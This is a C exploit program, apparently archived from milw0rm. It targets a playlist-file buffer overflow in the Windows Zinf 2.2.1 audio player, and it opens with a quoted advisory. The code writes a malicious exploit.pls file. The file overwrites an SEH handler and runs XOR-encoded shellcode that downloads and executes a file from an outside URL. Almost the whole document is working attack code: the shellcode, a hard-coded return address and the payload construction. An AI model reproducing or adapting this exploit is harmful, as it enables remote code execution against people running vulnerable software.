                                                                                                                                                                                                                                                               
/*
-------------------------------Advisory----------------------------------
Luigi Auriemma <aluigi(aaaatttttt)autistici[D000t]org>

I don\'t know why this bug has not been tracked but moreover I don\'t
completely know why it has not been fixed yet in the Windows version of
Zinf.

In short, Zinf is an audio player for Linux and Windows: http://www.zinf.org
The latest Linux version is 2.2.5 while the latest Windows version is 2.2.1
which is still vulnerable to a buffer-overflow bug in the management of the
playlist files \".pls\".

This bug has been found and fixed by the same developers in the recent
versions for Linux but, as already said, the vulnerable Windows version is
still downloadable and can be exploited locally and remotely through the web
browser and a malicious pls file.

A simple proof-of-concept to test the bug is available here:

  http://aluigi.altervista.org/poc/zinf-bof.pls

That\'s all, just to keep track of this bug and to warn who uses the Windows
version.


BYEZ
--------------------------------------------------------------------------
hey Luigi how much Advisories do you release every month??maybe 30 ;)??
sometimes i think your day has 48 hours ;)

best regards



----------------------------------------------------------------------------
this exploit generates a file exploit.pls which overflows a seh handler
jumps into a service pack independent address then it downloads and executes a file


  you can also download this exploit i a rar file(www.delikon.de).
  in this rar file you will find some screenshots, from OllyDbg 
  which is maybe useful for beginners


*/

#include <stdio.h>
#include <windows.h>

#define SIZE 4048


char shellcode[] = \"\\xEB\"//xored with 0x1d
\"\\x10\\x58\\x31\\xC9\\x66\\x81\\xE9\\x22\\xFF\\x80\\x30\\x1D\\x40\\xE2\\xFA\\xEB\\x05\\xE8\\xEB\\xFF\"
\"\\xFF\\xFF\\xF4\\xD1\\x1D\\x1D\\x1D\\x42\\xF5\\x4B\\x1D\\x1D\\x1D\\x94\\xDE\\x4D\\x75\\x93\\x53\\x13\"
\"\\xF1\\xF5\\x7D\\x1D\\x1D\\x1D\\x2C\\xD4\\x7B\\xA4\\x72\\x73\\x4C\\x75\\x68\\x6F\\x71\\x70\\x49\\xE2\"
\"\\xCD\\x4D\\x75\\x2B\\x07\\x32\\x6D\\xF5\\x5B\\x1D\\x1D\\x1D\\x2C\\xD4\\x4C\\x4C\\x90\\x2A\\x4B\\x90\"
\"\\x6A\\x15\\x4B\\x4C\\xE2\\xCD\\x4E\\x75\\x85\\xE3\\x97\\x13\\xF5\\x30\\x1D\\x1D\\x1D\\x4C\\x4A\\xE2\"
\"\\xCD\\x2C\\xD4\\x54\\xFF\\xE3\\x4E\\x75\\x63\\xC5\\xFF\\x6E\\xF5\\x04\\x1D\\x1D\\x1D\\xE2\\xCD\\x48\"
\"\\x4B\\x79\\xBC\\x2D\\x1D\\x1D\\x1D\\x96\\x5D\\x11\\x96\\x6D\\x01\\xB0\\x96\\x75\\x15\\x94\\xF5\\x43\"
\"\\x40\\xDE\\x4E\\x48\\x4B\\x4A\\x96\\x71\\x39\\x05\\x96\\x58\\x21\\x96\\x49\\x18\\x65\\x1C\\xF7\\x96\"
\"\\x57\\x05\\x96\\x47\\x3D\\x1C\\xF6\\xFE\\x28\\x54\\x96\\x29\\x96\\x1C\\xF3\\x2C\\xE2\\xE1\\x2C\\xDD\"
\"\\xB1\\x25\\xFD\\x69\\x1A\\xDC\\xD2\\x10\\x1C\\xDA\\xF6\\xEF\\x26\\x61\\x39\\x09\\x68\\xFC\\x96\\x47\"
\"\\x39\\x1C\\xF6\\x7B\\x96\\x11\\x56\\x96\\x47\\x01\\x1C\\xF6\\x96\\x19\\x96\\x1C\\xF5\\xF4\\x1F\\x1D\"
\"\\x1D\\x1D\\x2C\\xDD\\x94\\xF7\\x42\\x43\\x40\\x46\\xDE\\xF5\\x32\\xE2\\xE2\\xE2\\x70\\x75\\x75\\x33\"
\"\\x78\\x65\\x78\\x1D\";







int main(){

char buffer[SIZE];
char exploit[]=\"exploit.pls\";
char head[]=\"[playlist]File1=\";
int i=0;
ULONG bytes=0;
char *pointer=NULL;
//for the decoder
short int weblength=0xff22;


ULONG RetAddr=0x10404DC4;
/*
SERVICE PACK independent
httpinput.pmi
10404DC4    5D              POP EBP
10404DC5    B8 18000000     MOV EAX,18
10404DCA    5B              POP EBX
10404DCB    C2 0800         RETN 8
*/
//jump into nops
DWORD jump=0x909025eb;
HANDLE file=NULL;

//this is a small messageBox app
char web[]=\"http://www.delikon.de/klein.exe\";


printf(\"A Buffer overflow exploit against Zinf 2.2.1 for Win32\\n\");
printf(\"Coded by Delikon|www.delikon.de|27.9.04\\n\");
printf(\"all credits goes to Luigi Auriemma\\n\");
printf(\"\\n [+] generate exploit.pls\\n\");



memset(buffer,0x00,SIZE-1);


 file = CreateFile(exploit, GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_ARCHIVE,NULL);

if(file == (HANDLE)0xffffffff){

	printf(\"\\t[+] error opening the file\\n\");
	printf(\"PRESS A KEY\\n\");
	getchar();
	return -1;

}	
	strcpy(buffer,head);
	
	memset(buffer+strlen(buffer),0x61,17);
	//nops
	memset(buffer+strlen(buffer),0x90,20);
	//
	strcat(buffer,shellcode);
	//search for the shellcode length
	pointer=strstr(buffer,\"\\x22\\xff\");
	//weblength[0]-=strlen(web)+1;
	weblength-=strlen(web)+1;
	//increase it
	memcpy(pointer,&weblength,2);
	

	//copy the url in the buffer
	strcat(buffer,web);


	//xor the url with 0x1d
	while(*(buffer+strlen(buffer)-strlen(web)+i)){

	
		*(buffer+strlen(buffer)-strlen(web)+i)=*(buffer+strlen(buffer)-strlen(web)+i)^0x1d;
		i++;
	}
	
	*(buffer+strlen(buffer)-strlen(web)+i)=0x1d;

	//copy the filling
	memset(buffer+strlen(buffer),0x61,517-strlen(buffer));
	//also filling ;)
	memcpy(buffer+strlen(buffer),&RetAddr,4);
	
	memset(buffer+strlen(buffer),0x41,4);
	memset(buffer+strlen(buffer),0x42,4);
		
	//jump 24 bytes forward
	memcpy(buffer+strlen(buffer),&jump,4);
	//jump into pop reg pop reg ret
	memcpy(buffer+strlen(buffer),&RetAddr,4);
	memset(buffer+strlen(buffer),0x45,4);
	memset(buffer+strlen(buffer),0x46,4);
	memset(buffer+strlen(buffer),0x47,4);
	
	

	WriteFile(file,buffer,strlen(buffer),&bytes,0);

	CloseHandle(file);
	printf(\"\\n [+] ready press a key\\n\");
	getchar();


	exit(1);

	
}

// milw0rm.com [2004-09-28]
